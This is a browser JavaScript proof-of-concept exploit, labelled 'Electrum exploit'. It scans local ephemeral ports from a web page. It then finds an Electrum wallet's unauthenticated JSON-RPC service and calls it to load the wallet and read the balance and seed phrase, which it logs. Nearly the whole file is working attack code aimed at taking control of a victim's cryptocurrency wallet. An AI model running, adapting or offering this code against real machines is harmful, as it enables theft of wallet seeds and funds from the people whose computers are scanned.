///////////////////////////////////////////////////////////////////////////////
// Local port scanning

const scanLocalPort = async (port, timeout) => {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `http://127.0.0.1:${port}`);
    xhr.timeout = timeout;

    xhr.onload = () => {
      resolve(true);
    };
    xhr.onerror = () => {
      resolve(false);
    };
    xhr.ontimeout = () => {
      resolve(false);
    };
    xhr.send();
  });
};

const scanLocalPortsBatch = async (startPort, count, timeout) => {
  console.log(`Scanning local ports ${startPort}-${startPort+count-1}`)
  const promises = [];
  for (let i = 0; i < count; ++i) {
    promises.push(scanLocalPort(startPort + i, timeout));
  }
  return Promise.all(promises).then(results => {
    const listeningPorts = [];
    for (let i = 0; i < count; ++i) {
      if (results[i]) {
        listeningPorts.push(startPort + i);
      }
    }
    return listeningPorts;
  });
};

const scanLocalPorts = async (startPort, endPort, maxBatchSize, timeout) => {
  let listeningPorts = [];
  for (let port = minPort; port <= maxPort; port += maxBatchSize) {
    const listeningPortsInBatch = await scanLocalPortsBatch(port, Math.min(maxPort-port + 1, maxBatchSize), timeout);
    listeningPorts = listeningPorts.concat(listeningPortsInBatch)
  }
  return listeningPorts;
};

///////////////////////////////////////////////////////////////////////////////
// Electrum exploit

const post = async ({url, headers, body, timeout}) => {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.timeout = timeout;
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve(xhr.responseText);
      } else {
        reject({
          status: xhr.status,
          statusText: xhr.statusText
        });
      }
    };
    xhr.onerror = () => {
      reject({
        status: xhr.status,
        statusText: xhr.statusText
      });
    };
    xhr.ontimeout = () => {
      reject({
        status: xhr.status,
        statusText: xhr.statusText
      });
    };
    Object.keys(headers).forEach(key => {
      xhr.setRequestHeader(key, headers[key]);
    });
    xhr.send(body);
  });
};

const localJsonRpc = async (port, method, params) => {
  return post({
    url: `http://127.0.0.1:${port}`,
    headers: {
      'accept': 'application/json-rpc',
      'content-type': 'application/json-rpc'
    },
    body: JSON.stringify({
      id: 1,
      method,
      params
    }),
    timeout: 1000
  }).then(responseText => {
    const response = JSON.parse(responseText);
    return response.result;
  });
};

const getElectrumVersion = async (port) => {
  console.log(`Looking for Electrum on port ${port}`);
  try {
    return await localJsonRpc(port, 'version', {});
  } catch(e) {
    return null;
  }
};

const electrumize = async (port) => {
  console.log(`[${port}] Loading wallet`);
  await localJsonRpc(port, 'daemon', [{subcommand: 'load_wallet'}]);
  
  console.log(`[${port}] Getting balance`);
  const balance = await localJsonRpc(port, 'getbalance', {}).confirmed || 0;
  
  console.log(`[${port}] Getting seed`);
  const seed = await localJsonRpc(port, 'getseed', {});
  
  console.log(`[${port}] balance = ${balance}, seed = ${seed}`);
};

///////////////////////////////////////////////////////////////////////////////
// Main

// Magic values based on trial and error on Chrome
const portsBatchSize = 100;
const timeout = 500;

// See https://en.wikipedia.org/wiki/Ephemeral_port
const minPort = 49152;
const maxPort = 65535;

const main = async () => {
  const listeningPorts = await scanLocalPorts(minPort, maxPort, portsBatchSize, timeout);
  console.log(`Found ${listeningPorts.length} local listening ports: ${listeningPorts}`);
  
  for (let i = 0; i < listeningPorts.length; ++i) {
    const port = listeningPorts[i];
      
    const version = await getElectrumVersion(port);
    if (version) {
      console.log(`Found Electrum version ${version} on port ${port}`);
      await electrumize(port);
    }
  }
};

main().then(() => console.log('done'));
